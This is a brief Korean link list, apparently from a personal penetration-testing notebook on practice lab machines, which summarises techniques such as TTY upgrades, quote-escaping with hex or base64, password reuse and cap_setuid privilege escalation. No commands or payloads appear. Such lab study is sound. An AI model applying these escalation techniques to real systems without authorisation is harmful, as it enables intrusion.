- [[plum]] — `su` 의 TTY 요구 여부 실측이 나온 박스
- [[Hawat]] — 인용 중첩을 hex 리터럴로 회피 · `python3` 없는 환경의 TTY 업그레이드
- [[Exfiltrated]] — 인용 중첩을 base64로 회피
- [[Robust]] · [[Crane]] · [[Fanatastic]] — 평문 비밀번호 재사용 계열
- [[_PLAYBOOK#A-6-14. 내가 찾아본 곳에 없다 ≠ 존재하지 않는다 — 부재 증거를 존재 부정으로 승격시키지 않는다]] — 이 박스에서 정확했던 절이 삭제된 사건의 일반화
- [[_PLAYBOOK#B-3-16. getcap 결과에서 노이즈와 후보를 가른다 — GTFOBins 원문이 정확히 그 최대치다]] — `cap_setuid` 판별과 `os.setgid(0)` 보강 실패
- [[01. Pentest Foundations]] — Levram 항목 · [[Crane]] · [[Hub]] — 같은 컬렉션 앞 박스
